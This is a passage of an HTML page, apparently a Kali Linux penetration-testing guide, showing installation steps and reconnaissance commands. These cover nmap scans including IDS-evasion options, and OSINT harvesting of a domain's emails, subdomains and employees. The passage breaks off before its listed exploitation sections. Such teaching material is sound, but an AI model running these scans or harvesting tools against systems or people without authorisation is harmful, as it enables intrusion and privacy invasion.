@@ -1,0 +1,882 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Mastering Kali Linux | Nisarg Chasmawala</title>
+<meta name="description" content="Mastering Kali Linux Cybersecurity Tools - a complete professional guide by Nisarg Chasmawala (Shroff), Offensive Security Engineer.">
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&family=Rajdhani:wght@300;400;600;700&display=swap" rel="stylesheet">
+<style>
+:root{--g:#00ff41;--c:#00e5ff;--p:#bf00ff;--r:#ff003c;--o:#ffd700;--bg:#030509;--t1:#d4ffe0;--t2:#7aad82;--t3:#2e4a32;--mono:'Share Tech Mono',monospace;--dsp:'Orbitron',sans-serif;--body:'Rajdhani',sans-serif;--glow:0 0 20px rgba(0,255,65,.4),0 0 60px rgba(0,255,65,.15);--cglow:0 0 20px rgba(0,229,255,.4),0 0 60px rgba(0,229,255,.1);--pglow:0 0 20px rgba(191,0,255,.4),0 0 60px rgba(191,0,255,.1)}
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth;overflow-x:hidden}
+body{background:var(--bg);color:var(--t1);font-family:var(--body);font-size:17px;line-height:1.8;overflow-x:hidden;cursor:none}
+#bg-particle{position:fixed;inset:0;z-index:0;pointer-events:none}
+#bg-hex{position:fixed;inset:0;z-index:0;pointer-events:none;opacity:.35}
+#bg-scan{position:fixed;inset:0;z-index:9999;pointer-events:none;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,255,65,.009) 2px,rgba(0,255,65,.009) 4px)}
+#bg-vignette{position:fixed;inset:0;z-index:1;pointer-events:none;background:radial-gradient(ellipse at 50% 50%,transparent 50%,rgba(3,5,9,.85) 100%)}
+#bg-noise{position:fixed;inset:0;z-index:2;pointer-events:none;opacity:.04;background-image:url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)'/%3E%3C/svg%3E");background-size:200px 200px;animation:grain .4s steps(1) infinite}
+@keyframes grain{0%{transform:translate(0,0)}10%{transform:translate(-2%,-2%)}20%{transform:translate(2%,2%)}30%{transform:translate(-1%,1%)}40%{transform:translate(1%,-1%)}50%{transform:translate(-3%,1%)}60%{transform:translate(1%,3%)}70%{transform:translate(-1%,-2%)}80%{transform:translate(2%,1%)}90%{transform:translate(-2%,2%)}}
+#cur{position:fixed;width:10px;height:10px;border-radius:50%;background:var(--g);box-shadow:var(--glow);pointer-events:none;z-index:99999;transform:translate(-50%,-50%);transition:width .1s,height .1s}
+#cur2{position:fixed;width:30px;height:30px;border-radius:50%;border:1px solid rgba(0,255,65,.5);pointer-events:none;z-index:99998;transform:translate(-50%,-50%);transition:left .08s,top .08s}
+#cur3{position:fixed;width:50px;height:50px;border-radius:50%;border:1px solid rgba(0,255,65,.2);pointer-events:none;z-index:99997;transform:translate(-50%,-50%);transition:left .15s,top .15s}
+#prog{position:fixed;top:0;left:0;height:2px;background:linear-gradient(to right,var(--g),var(--c),var(--p));box-shadow:0 0 10px var(--g);z-index:10000;width:0%}
+.topbar{position:fixed;top:0;left:0;right:0;height:58px;background:rgba(3,5,9,.88);border-bottom:1px solid rgba(0,255,65,.12);backdrop-filter:blur(20px) saturate(1.5);z-index:1000;display:flex;align-items:center;justify-content:space-between;padding:0 32px}
+.tb-left{display:flex;flex-direction:column;gap:2px}
+.tb-name{font-family:var(--dsp);font-size:13px;font-weight:900;color:var(--t1);letter-spacing:3px}
+.tb-roles{font-family:var(--mono);font-size:9px;letter-spacing:1.5px;overflow:hidden;white-space:nowrap}
+.tb-inner{display:inline-block;color:var(--c);animation:ticker 18s linear infinite}
+@keyframes ticker{0%{transform:translateX(100%)}100%{transform:translateX(-100%)}}
+.tb-status{display:flex;align-items:center;gap:8px;font-family:var(--mono);font-size:11px;color:var(--g)}
+.tb-dot{width:7px;height:7px;border-radius:50%;background:var(--g);box-shadow:0 0 10px var(--g);animation:tdot 1.2s ease-in-out infinite}
+@keyframes tdot{0%,100%{opacity:1;transform:scale(1)}50%{opacity:.3;transform:scale(.7)}}
+.toc{position:fixed;right:20px;top:50%;transform:translateY(-50%);z-index:200;display:flex;flex-direction:column;gap:9px}
+.toc-i{display:flex;align-items:center;gap:8px;cursor:pointer}
+.toc-d{width:6px;height:6px;border-radius:50%;border:1px solid var(--t3);transition:all .25s;flex-shrink:0}
+.toc-i.active .toc-d,.toc-i:hover .toc-d{background:var(--g);border-color:var(--g);box-shadow:0 0 10px var(--g)}
+.toc-l{font-family:var(--mono);font-size:10px;color:var(--t3);opacity:0;transform:translateX(6px);transition:all .2s;white-space:nowrap}
+.toc-i:hover .toc-l,.toc-i.active .toc-l{opacity:1;transform:none;color:var(--g)}
+@media(max-width:1000px){.toc{display:none}}
+.wrap{position:relative;z-index:10;max-width:980px;margin:0 auto;padding:0 28px}
+.hero{min-height:100vh;display:flex;flex-direction:column;justify-content:center;padding:100px 0 60px;position:relative}
+.hero-canvas-wrap{position:absolute;right:-80px;top:50%;transform:translateY(-52%);width:500px;height:500px;pointer-events:none}
+#hero-geo{width:100%;height:100%}
+.hero-tag{font-family:var(--mono);font-size:11px;letter-spacing:4px;color:var(--c);text-transform:uppercase;margin-bottom:18px;opacity:0;animation:fup .6s ease forwards .3s;display:flex;align-items:center;gap:12px}
+.hero-tag::before{content:'';width:40px;height:1px;background:linear-gradient(to right,transparent,var(--c))}
+.hero-tag::after{content:'';flex:1;max-width:100px;height:1px;background:linear-gradient(to right,var(--c),transparent)}
+.hero-title{font-family:var(--dsp);font-size:clamp(18px,3.5vw,42px);font-weight:900;line-height:1.0;letter-spacing:2px;text-transform:uppercase;margin-bottom:8px;opacity:0;animation:fup .7s ease forwards .5s}
+.ht-line1{display:block;color:var(--g);text-shadow:0 0 40px rgba(0,255,65,.6),0 0 100px rgba(0,255,65,.25)}
+.ht-sub{display:block;font-size:.43em;letter-spacing:5px;color:rgba(200,255,220,.5);font-weight:400;margin-top:10px}
+.gw{position:relative;display:inline-block}
+.gw::before,.gw::after{content:attr(data-t);position:absolute;top:0;left:0;width:100%;font-family:var(--dsp);font-weight:900;font-size:inherit;letter-spacing:inherit;text-transform:uppercase}
+.gw::before{color:var(--c);animation:ga 5s infinite;clip-path:polygon(0 0,100% 0,100% 33%,0 33%)}
+.gw::after{color:var(--r);animation:gb 5s infinite;clip-path:polygon(0 66%,100% 66%,100% 100%,0 100%)}
+@keyframes ga{0%,85%,100%{transform:none;opacity:0}87%{transform:translate(-5px,2px);opacity:.9}93%{transform:none;opacity:0}}
+@keyframes gb{0%,87%,100%{transform:none;opacity:0}89%{transform:translate(5px,3px);opacity:.8}95%{transform:none;opacity:0}}
+.hero-desc{font-size:17px;font-weight:300;color:var(--t2);max-width:560px;line-height:1.75;margin-bottom:36px;opacity:0;animation:fup .8s ease forwards .8s;margin-top:20px}
+.hero-meta{display:flex;gap:24px;flex-wrap:wrap;opacity:0;animation:fup .8s ease forwards 1s}
+.m-item{display:flex;flex-direction:column;gap:3px}
+.m-lbl{font-family:var(--mono);font-size:9px;letter-spacing:3px;color:var(--t3);text-transform:uppercase}
+.m-val{font-family:var(--mono);font-size:12px;color:var(--c)}
+.hero-scroll-hint{position:absolute;bottom:24px;left:0;display:flex;align-items:center;gap:12px;opacity:0;animation:fin 1s ease forwards 1.8s}
+.hs-line{width:60px;height:1px;background:linear-gradient(to right,var(--g),transparent)}
+.hs-txt{font-family:var(--mono);font-size:9px;letter-spacing:3px;color:var(--t3)}
+.hs-pulse{width:6px;height:6px;border-radius:50%;background:var(--g);box-shadow:0 0 8px var(--g);animation:tdot 1.5s ease-in-out infinite}
+.sec{margin-bottom:100px}
+.sec-hd{display:flex;align-items:center;gap:14px;margin-bottom:40px}
+.sec-n{font-family:var(--mono);font-size:10px;color:var(--p);letter-spacing:2px;min-width:44px}
+.sec-ln{flex:1;height:1px;background:linear-gradient(to right,rgba(0,229,255,.35),transparent)}
+.sec-t{font-family:var(--dsp);font-size:clamp(14px,2.4vw,21px);font-weight:700;letter-spacing:3px;text-transform:uppercase;color:var(--c);text-shadow:var(--cglow)}
+.tw-cursor{display:inline-block;width:2px;height:1em;background:var(--c);margin-left:4px;animation:blink 1s step-end infinite;vertical-align:middle}
+@keyframes blink{0%,100%{opacity:1}50%{opacity:0}}
+.sec-ai .sec-t{color:#bf00ff;text-shadow:var(--pglow)}
+.sec-ai .sec-n{color:var(--c)}
+.sec-ai .sec-ln{background:linear-gradient(to right,rgba(191,0,255,.35),transparent)}
+.sec-ai .tw-cursor{background:#bf00ff}
+.panel{background:rgba(0,255,65,.025);border:1px solid rgba(0,255,65,.12);border-radius:4px;padding:32px;margin-bottom:22px;position:relative;overflow:hidden;transition:border-color .3s,box-shadow .3s,transform .3s}
+.panel::before{content:'';position:absolute;top:0;left:0;width:3px;height:100%;background:linear-gradient(to bottom,var(--g),transparent);opacity:0;transition:opacity .3s}
+.panel::after{content:'';position:absolute;inset:0;background:linear-gradient(135deg,rgba(255,255,255,.015) 0%,transparent 60%);pointer-events:none}
+.panel:hover{border-color:rgba(0,229,255,.4);box-shadow:0 0 50px rgba(0,229,255,.07),0 20px 60px rgba(0,0,0,.3);transform:translateY(-3px)}
+.panel:hover::before{opacity:1}
+.panel p{color:var(--t2);margin-bottom:12px}
+.panel p:last-child{margin-bottom:0}
+.panel-t{font-family:var(--dsp);font-size:12px;font-weight:700;letter-spacing:3px;color:var(--g);text-transform:uppercase;margin-bottom:18px;display:flex;align-items:center;gap:12px}
+.panel-t::after{content:'';flex:1;height:1px;background:linear-gradient(to right,rgba(0,255,65,.2),transparent)}
+.panel-ai{background:rgba(191,0,255,.03);border-color:rgba(191,0,255,.18)}
+.panel-ai:hover{border-color:rgba(191,0,255,.45)}
+.panel-ai .panel-t{color:#bf00ff}
+.panel-ai .panel-t::after{background:linear-gradient(to right,rgba(191,0,255,.2),transparent)}
+.panel-ai::before{background:linear-gradient(to bottom,#bf00ff,transparent)}
+.ai-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(270px,1fr));gap:16px;margin:20px 0}
+.ai-card{background:rgba(191,0,255,.04);border:1px solid rgba(191,0,255,.18);border-radius:4px;padding:22px;position:relative;overflow:hidden;transition:all .3s}
+.ai-card::after{content:'';position:absolute;top:0;right:0;width:0;height:0;border-top:26px solid rgba(191,0,255,.25);border-left:26px solid transparent}
+.ai-card:hover{border-color:rgba(191,0,255,.5);box-shadow:var(--pglow),0 16px 40px rgba(0,0,0,.25);transform:translateY(-3px)}
+.ai-ico{font-size:24px;margin-bottom:10px;display:block}
+.ai-name{font-family:var(--dsp);font-size:11px;font-weight:700;letter-spacing:2px;color:#bf00ff;text-transform:uppercase;margin-bottom:10px}
+.ai-desc{font-size:14px;color:var(--t2);line-height:1.65;font-weight:300}
+.alert{border-radius:4px;padding:16px 20px;margin:20px 0;display:flex;gap:14px;align-items:flex-start}
+.al-w{background:rgba(255,215,0,.04);border:1px solid rgba(255,215,0,.18);border-left:3px solid var(--o)}
+.al-p{background:rgba(191,0,255,.04);border:1px solid rgba(191,0,255,.18);border-left:3px solid #bf00ff}
+.al-i{background:rgba(0,229,255,.04);border:1px solid rgba(0,229,255,.14);border-left:3px solid var(--c)}
+.al-ic{font-family:var(--mono);font-size:13px;flex-shrink:0;margin-top:2px}
+.al-w .al-ic{color:var(--o)}.al-p .al-ic{color:#bf00ff}.al-i .al-ic{color:var(--c)}
+.al-tx{font-size:14px;color:var(--t2);line-height:1.6}
+.ptbl{width:100%;border-collapse:collapse;font-family:var(--mono);font-size:12px;margin:16px 0}
+.ptbl th{text-align:left;padding:11px 14px;color:var(--c);border-bottom:1px solid rgba(0,229,255,.3);letter-spacing:2px;font-size:10px;text-transform:uppercase}
+.ptbl td{padding:10px 14px;color:var(--t2);border-bottom:1px solid rgba(0,255,65,.05);vertical-align:top}
+.ptbl tr:hover td{background:rgba(0,255,65,.02)}
+.ptbl td:first-child{color:var(--g);font-weight:700}
+.tgrid{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:14px;margin:20px 0}
+.tc{background:rgba(0,229,255,.03);border:1px solid rgba(0,229,255,.1);border-radius:4px;padding:18px;transition:all .25s;position:relative;overflow:hidden}
+.tc::after{content:'';position:absolute;bottom:0;left:0;right:0;height:2px;background:linear-gradient(to right,var(--c),transparent);transform:scaleX(0);transform-origin:left;transition:transform .3s}
+.tc:hover{border-color:rgba(0,229,255,.4);background:rgba(0,229,255,.06);box-shadow:var(--cglow),0 12px 40px rgba(0,0,0,.2);transform:translateY(-3px)}
+.tc:hover::after{transform:scaleX(1)}
+.tcname{font-family:var(--mono);font-size:12px;color:var(--c);margin-bottom:4px}
+.tctag{font-family:var(--mono);font-size:9px;letter-spacing:2px;color:var(--o);text-transform:uppercase;margin-bottom:6px;display:block}
+.tcdesc{font-size:12px;color:var(--t3);line-height:1.45}
+.cb{background:rgba(0,0,0,.7);border:1px solid rgba(0,255,65,.1);border-left:3px solid var(--g);border-radius:0 4px 4px 0;padding:22px 26px;margin:16px 0;position:relative;overflow-x:auto;cursor:pointer;transition:all .3s}
+.cb::before{content:attr(data-l);position:absolute;top:0;right:0;font-family:var(--mono);font-size:9px;letter-spacing:2px;color:var(--g);background:rgba(0,255,65,.07);padding:3px 12px;border-bottom-left-radius:4px;text-transform:uppercase}
+.cb:hover{border-color:rgba(0,255,65,.35)}
+.cb.cb-ai{border-left-color:#bf00ff}.cb.cb-ai::before{color:#bf00ff;background:rgba(191,0,255,.07)}
+.cb code{font-family:var(--mono);font-size:13px;color:var(--g);white-space:pre;display:block;line-height:1.9}
+.tool-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(220px,1fr));gap:16px;margin:22px 0}
+.tool-card{background:rgba(0,255,65,.03);border:1px solid rgba(0,255,65,.14);border-radius:4px;padding:20px;position:relative;overflow:hidden;transition:all .3s}
+.tool-card::after{content:'';position:absolute;top:0;right:0;width:0;height:0;border-top:28px solid rgba(0,255,65,.15);border-left:28px solid transparent}
+.tool-card:hover{border-color:rgba(0,229,255,.4);box-shadow:var(--cglow),0 12px 40px rgba(0,0,0,.2);transform:translateY(-3px)}
+.tool-name{font-family:var(--mono);font-size:13px;color:var(--g);margin-bottom:4px;font-weight:700}
+.tool-cat{font-family:var(--mono);font-size:9px;letter-spacing:2px;color:var(--o);text-transform:uppercase;margin-bottom:8px;display:block}
+.tool-desc{font-size:13px;color:var(--t2);line-height:1.55}
+.cta{background:linear-gradient(135deg,rgba(0,255,65,.04),rgba(191,0,255,.04));border:1px solid rgba(0,229,255,.3);border-radius:4px;padding:60px 50px;text-align:center;position:relative;overflow:hidden;margin-top:80px}
+.cta::before{content:'KALI';position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);font-family:var(--dsp);font-size:180px;font-weight:900;color:rgba(0,255,65,.018);pointer-events:none;letter-spacing:20px}
+.cta-t{font-family:var(--dsp);font-size:20px;font-weight:700;letter-spacing:4px;color:var(--g);text-transform:uppercase;margin-bottom:16px;text-shadow:var(--glow)}
+.cta-p{color:var(--t2);font-size:16px;max-width:540px;margin:0 auto 32px;line-height:1.75}
+.cta-btns{display:flex;gap:16px;justify-content:center;flex-wrap:wrap}
+.btn{font-family:var(--mono);font-size:11px;letter-spacing:3px;text-transform:uppercase;padding:13px 30px;border-radius:2px;text-decoration:none;display:inline-block;transition:all .25s}
+.btn-p{border:1px solid var(--g);color:var(--g);background:rgba(0,255,65,.06)}
+.btn-p:hover{background:var(--g);color:var(--bg);box-shadow:var(--glow)}
+.btn-s{border:1px solid var(--c);color:var(--c);background:rgba(0,229,255,.05)}
+.btn-s:hover{background:var(--c);color:var(--bg);box-shadow:var(--cglow)}
+.footer{border-top:1px solid rgba(0,255,65,.1);padding:32px 0;margin-top:60px;display:flex;align-items:flex-start;justify-content:space-between;flex-wrap:wrap;gap:20px}
+.f-l{font-family:var(--mono);font-size:11px;color:var(--t3);letter-spacing:1.5px;line-height:2}
+.f-alias{color:var(--g);font-size:10px;letter-spacing:3px;text-shadow:0 0 8px var(--g)}
+.f-r{font-family:var(--mono);font-size:11px;color:var(--t3);text-align:right;line-height:2}
+.f-r a{color:var(--g);text-decoration:none}
+.f-r a:hover{text-shadow:var(--glow)}
+.div{height:1px;background:linear-gradient(to right,transparent,rgba(0,255,65,.15),transparent);margin:60px 0;position:relative}
+.div::after{content:'';position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);width:6px;height:6px;border-radius:50%;background:var(--g);box-shadow:0 0 12px var(--g)}
+.div-ai{background:linear-gradient(to right,transparent,rgba(191,0,255,.22),transparent)}
+.div-ai::after{background:#bf00ff;box-shadow:0 0 12px #bf00ff}
+@keyframes fup{from{opacity:0;transform:translateY(24px)}to{opacity:1;transform:none}}
+@keyframes fin{from{opacity:0}to{opacity:1}}
+.rv{opacity:0;transform:translateY(30px);transition:opacity .8s,transform .8s}
+.rv-l{opacity:0;transform:translateX(-30px);transition:opacity .8s,transform .8s}
+.rv.on,.rv-l.on{opacity:1;transform:none}
+@media(max-width:700px){.ai-grid,.tgrid,.tool-grid{grid-template-columns:1fr}.hero-canvas-wrap{display:none}.cta{padding:36px 20px}}
+</style>
+</head>
+<body>
+<canvas id="bg-particle"></canvas>
+<canvas id="bg-hex"></canvas>
+<div id="bg-vignette"></div>
+<div id="bg-noise"></div>
+<div id="bg-scan"></div>
+<div id="cur"></div><div id="cur2"></div><div id="cur3"></div>
+<div id="prog"></div>
+<nav class="topbar">
+  <div class="tb-left">
+    <span class="tb-name">NISARG CHASMAWALA (SHROFF)</span>
+    <div class="tb-roles"><span class="tb-inner">Penetration Tester &nbsp;|&nbsp; Vulnerability Assessment &nbsp;|&nbsp; Cybersecurity Researcher &nbsp;|&nbsp; Offensive Security Engineer &nbsp;|&nbsp; Digital Forensics &nbsp;|&nbsp; Penetration Tester &nbsp;|&nbsp; Vulnerability Assessment &nbsp;|&nbsp; Cybersecurity Researcher &nbsp;|&nbsp; Offensive Security Engineer &nbsp;|&nbsp; Digital Forensics</span></div>
+  </div>
+  <div class="tb-status"><span class="tb-dot"></span>SYS ONLINE</div>
+</nav>
+<nav class="toc" id="toc">
+  <div class="toc-i active" onclick="goTo('#hero')" data-s="hero"><div class="toc-d"></div><span class="toc-l">INTRO</span></div>
+  <div class="toc-i" onclick="goTo('#install')" data-s="install"><div class="toc-d"></div><span class="toc-l">INSTALLATION</span></div>
+  <div class="toc-i" onclick="goTo('#recon')" data-s="recon"><div class="toc-d"></div><span class="toc-l">RECON TOOLS</span></div>
+  <div class="toc-i" onclick="goTo('#web')" data-s="web"><div class="toc-d"></div><span class="toc-l">WEB APP TOOLS</span></div>
+  <div class="toc-i" onclick="goTo('#password')" data-s="password"><div class="toc-d"></div><span class="toc-l">PASSWORD ATTACKS</span></div>
+  <div class="toc-i" onclick="goTo('#exploit')" data-s="exploit"><div class="toc-d"></div><span class="toc-l">EXPLOITATION</span></div>
+  <div class="toc-i" onclick="goTo('#postex')" data-s="postex"><div class="toc-d"></div><span class="toc-l">POST-EXPLOITATION</span></div>
+  <div class="toc-i" onclick="goTo('#wireless')" data-s="wireless"><div class="toc-d"></div><span class="toc-l">WIRELESS</span></div>
+  <div class="toc-i" onclick="goTo('#ai')" data-s="ai"><div class="toc-d"></div><span class="toc-l">AI INTEGRATION</span></div>
+</nav>
+<div class="wrap">
+
+<section class="hero" id="hero">
+  <div class="hero-canvas-wrap"><canvas id="hero-geo"></canvas></div>
+  <div class="hero-tag">NISARG CHASMAWALA &nbsp;//&nbsp; ALIAS: HEAVEN</div>
+  <h1 class="hero-title">
+    <div class="gw" data-t="KALI LINUX"><span class="ht-line1">KALI LINUX</span></div>
+    <span class="ht-sub">MASTERING CYBERSECURITY TOOLS &middot; AI INTEGRATION</span>
+  </h1>
+  <p class="hero-desc">The definitive field guide to Kali Linux and its cybersecurity tool ecosystem. From installation and environment setup to information gathering, web application testing, password attacks, exploitation, post-exploitation, wireless security, and AI-powered automation -- every major tool category mastered with professional command references, real-world usage patterns, and practical integration techniques.</p>
+  <div class="hero-meta">
+    <div class="m-item"><span class="m-lbl">Author</span><span class="m-val">Nisarg Chasmawala (Shroff)</span></div>
+    <div class="m-item"><span class="m-lbl">Alias</span><span class="m-val">HEAVEN</span></div>
+    <div class="m-item"><span class="m-lbl">Platform</span><span class="m-val">Kali Linux &middot; Parrot OS &middot; BlackArch</span></div>
+    <div class="m-item"><span class="m-lbl">Category</span><span class="m-val">Tools &middot; Red Team &middot; AI</span></div>
+  </div>
+  <div class="hero-scroll-hint"><div class="hs-line"></div><span class="hs-txt">SCROLL TO BEGIN</span><div class="hs-pulse"></div></div>
+</section>
+<div class="div"></div>
+
+<!-- 01 INSTALLATION -->
+<section class="sec rv" id="install">
+  <div class="sec-hd"><span class="sec-n">01 //</span><h2 class="sec-t">Installation &amp; Environment Setup<span class="tw-cursor"></span></h2><div class="sec-ln"></div></div>
+  <div class="panel rv-l">
+    <p><strong style="color:var(--t1)">Kali Linux</strong> is a Debian-based distribution developed and maintained by Offensive Security, purpose-built for penetration testing, digital forensics, and security research. It ships with over 600 pre-installed security tools organised into menus by function -- information gathering, vulnerability analysis, web application analysis, password attacks, wireless attacks, reverse engineering, exploitation tools, sniffing and spoofing, post-exploitation, forensics, reporting, and social engineering. Kali is the industry standard for offensive security professionals and is used in every major penetration testing certification including OSCP, CEH, CPENT, and GPEN.</p>
+    <p>Kali can be installed as a <strong style="color:var(--c)">bare-metal OS</strong>, run as a <strong style="color:var(--c)">virtual machine</strong> in VirtualBox or VMware, deployed as a <strong style="color:var(--c)">WSL2 subsystem</strong> on Windows, run from a <strong style="color:var(--c)">live USB</strong> without installation, or pulled as a <strong style="color:var(--c)">Docker container</strong> for isolated testing environments. Each deployment mode has distinct advantages depending on the engagement context.</p>
+  </div>
+  <div class="cb rv" data-l="Kali Linux -- Install, Update and Essential Setup">
+    <code><span style="color:var(--t3)"># Download Kali: https://www.kali.org/get-kali/
+# Verify ISO integrity (always verify before installing)</span>
+<span style="color:var(--c)">sha256sum</span> kali-linux-2024.1-installer-amd64.iso
+<span style="color:var(--t3)"># Compare with official checksum at kali.org/docs/introduction/download-official-kali-linux-images/</span>
+
+<span style="color:var(--t3)"># WSL2 install (Windows)</span>
+<span style="color:var(--c)">wsl --install -d kali-linux</span>
+<span style="color:var(--c)">wsl -d kali-linux</span>
+
+<span style="color:var(--t3)"># Docker (isolated testing)</span>
+<span style="color:var(--c)">docker pull</span> kalilinux/kali-rolling
+<span style="color:var(--c)">docker run</span> <span style="color:var(--o)">-it --rm</span> kalilinux/kali-rolling /bin/bash
+
+<span style="color:var(--t3)"># Full system update (run after every install)</span>
+<span style="color:var(--c)">sudo apt update && sudo apt full-upgrade -y</span>
+<span style="color:var(--c)">sudo apt autoremove -y && sudo apt autoclean</span>
+
+<span style="color:var(--t3)"># Install meta-packages (tool bundles)</span>
+<span style="color:var(--c)">sudo apt install</span> kali-tools-top10          <span style="color:var(--t3)"># Top 10 most-used tools</span>
+<span style="color:var(--c)">sudo apt install</span> kali-linux-large          <span style="color:var(--t3)"># Full large tool suite</span>
+<span style="color:var(--c)">sudo apt install</span> kali-tools-web            <span style="color:var(--t3)"># Web application testing tools</span>
+<span style="color:var(--c)">sudo apt install</span> kali-tools-wireless       <span style="color:var(--t3)"># Wireless attack tools</span>
+<span style="color:var(--c)">sudo apt install</span> kali-tools-forensics      <span style="color:var(--t3)"># Digital forensics tools</span>
+
+<span style="color:var(--t3)"># Essential configuration</span>
+<span style="color:var(--c)">sudo systemctl enable ssh && sudo systemctl start ssh</span>
+<span style="color:var(--c)">sudo ufw enable</span>
+<span style="color:var(--c)">timedatectl set-timezone</span> UTC               <span style="color:var(--t3)"># Consistent timestamps in logs</span>
+
+<span style="color:var(--t3)"># Python tooling (many tools require pip packages)</span>
+<span style="color:var(--c)">sudo apt install</span> python3-pip python3-venv
+<span style="color:var(--c)">pip3 install</span> impacket bloodhound crackmapexec</code>
+  </div>
+</section>
+
+<div class="div"></div>
+
+<!-- 02 RECON -->
+<section class="sec rv" id="recon">
+  <div class="sec-hd"><span class="sec-n">02 //</span><h2 class="sec-t">Information Gathering &amp; Reconnaissance<span class="tw-cursor"></span></h2><div class="sec-ln"></div></div>
+  <div class="panel rv-l">
+    <p>Information gathering is the first and most critical phase of any penetration test. The quality of reconnaissance directly determines the quality of every subsequent phase -- poor recon means missed attack surfaces and failed engagements. Kali provides a comprehensive toolkit for both <strong style="color:var(--c)">passive OSINT</strong> (gathering information without touching the target) and <strong style="color:var(--c)">active scanning</strong> (directly probing target systems within the authorised scope). The boundary between these must be understood and respected -- passive recon is generally always acceptable, active scanning requires written authorisation.</p>
+  </div>
+  <div class="cb rv" data-l="Nmap -- Network Discovery and Port Scanning">
+    <code><span style="color:var(--t3)"># NMAP -- the industry-standard network scanner
+# Basic host discovery (ping sweep)</span>
+<span style="color:var(--c)">nmap</span> <span style="color:var(--o)">-sn</span> 192.168.1.0/24
+
+<span style="color:var(--t3)"># SYN scan (stealth) on top 1000 ports</span>
+<span style="color:var(--c)">sudo nmap</span> <span style="color:var(--o)">-sS</span> 192.168.1.10
+
+<span style="color:var(--t3)"># Full comprehensive scan (the pentest favourite)</span>
+<span style="color:var(--c)">sudo nmap</span> <span style="color:var(--o)">-sS -sV -sC -O -A -p-</span> 192.168.1.10 <span style="color:var(--o)">-oN</span> full_scan.txt
+<span style="color:var(--t3)"># -sS = SYN scan  -sV = version detection  -sC = default scripts
+# -O = OS fingerprint  -A = aggressive  -p- = all 65535 ports</span>
+
+<span style="color:var(--t3)"># Vulnerability scan with NSE scripts</span>
+<span style="color:var(--c)">sudo nmap</span> <span style="color:var(--o)">--script vuln</span> 192.168.1.10
+<span style="color:var(--c)">sudo nmap</span> <span style="color:var(--o)">--script smb-vuln*</span> 192.168.1.10   <span style="color:var(--t3)"># All SMB vulnerability scripts</span>
+<span style="color:var(--c)">sudo nmap</span> <span style="color:var(--o)">--script http-title</span> 192.168.1.0/24  <span style="color:var(--t3)"># Grab HTTP titles across subnet</span>
+
+<span style="color:var(--t3)"># UDP scan (catches DNS, SNMP, TFTP)</span>
+<span style="color:var(--c)">sudo nmap</span> <span style="color:var(--o)">-sU --top-ports 100</span> 192.168.1.10
+
+<span style="color:var(--t3)"># Evasion techniques (fragmented packets, decoys)</span>
+<span style="color:var(--c)">sudo nmap</span> <span style="color:var(--o)">-sS -f -D</span> RND:10 192.168.1.10  <span style="color:var(--t3)"># Fragment + 10 random decoys</span>
+<span style="color:var(--c)">sudo nmap</span> <span style="color:var(--o)">-sS --scan-delay 500ms</span> 192.168.1.10  <span style="color:var(--t3)"># Slow scan to avoid IDS</span>
+
+<span style="color:var(--t3)"># Save output in all formats</span>
+<span style="color:var(--c)">sudo nmap</span> <span style="color:var(--o)">-sV -p-</span> 10.10.10.1 <span style="color:var(--o)">-oA</span> results  <span style="color:var(--t3)"># .nmap .xml .gnmap</span></code>
+  </div>
+  <div class="cb rv" data-l="Recon-ng + theHarvester + Shodan -- OSINT Tools">
+    <code><span style="color:var(--t3)"># THEHARVESTOR -- email, subdomain, and employee harvesting</span>
+<span style="color:var(--c)">theHarvester</span> <span style="color:var(--o)">-d</span> example.com <span style="color:var(--o)">-b</span> all              <span style="color:var(--t3)"># All sources</span>
+<span style="color:var(--c)">theHarvester</span> <span style="color:var(--o)">-d</span> example.com <span style="color:var(--o)">-b</span> google,bing,shodan
+<span style="color:var(--c)">theHarvester</span> <span style="color:var(--o)">-d</span> example.com <span style="color:var(--o)">-b</span> all <span style="color:var(--o)">-f</span> output.html    <span style="color:var(--t3)"># HTML report</span>
+
+<span style="color:var(--t3"># RECON-NG -- modular OSINT framework (like Metasploit for recon)</span>
+<span style="color:var(--c)">recon-ng</span>
+<span style="color:var(--c)">[recon-ng] > marketplace install all</span>         <span style="color:var(--t3)"># Install all modules</span>
+<span style="color:var(--c)">[recon-ng] > workspaces create</span> target_co
+<span style="color:var(--c)">[recon-ng] > db insert domains</span>               <span style="color:var(--t3)"># Add target domain</span>
+<span style="color:var(--c)">[recon-ng] > modules load recon/domains-hosts/bing_domain_web</span>
+<span style="color:var(--c)">[recon-ng] > run</span>
+
+<span style="color:var(--t3)"># DNSENUM -- DNS enumeration and zone transfer attempts</span>
+<span style="color:var(--c)">dnsenum</span> example.com
+<span style="color:var(--c)">dnsenum</span> <span style="color:var(--o)">--dnsserver</span> 8.8.8.8 <span style="color:var(--o)">--subfile</span> subdomains.txt example.com
+
+<span style="color:var(--t3)"># AMASS -- in-depth subdomain enumeration</span>
+<span style="color:var(--c)">amass enum</span> <span style="color:var(--o)">-d</span> example.com                     <span style="color:var(--t3)"># Passive only</span>
+<span style="color:var(--c)">amass enum</span> <span style="color:var(--o)">-active -d</span> example.com             <span style="color:var(--t3)"># Active brute force</span>
+<span style="color:var(--c)">amass enum</span> <span style="color:var(--o)">-d</span> example.com <span style="color:var(--o)">-o</span> subdomains.txt
+
+<span style="color:var(--t3)"># SHODAN CLI -- IoT and exposed service discovery</span>
+<span style="color:var(--c)">shodan init</span> YOUR_API_KEY
+<span style="color:var(--c)">shodan search</span> <span style="color:var(--o)">--fields</span> ip_str,port,org,hostnames <span style="color:#ff79c6">"apache 2.2"</span>
+<span style="color:var(--c)">shodan host</span> 192.168.1.10                        <span style="color:var(--t3)"># Full info on specific IP</span></code>
+  </div>
+  <div class="tool-grid rv">
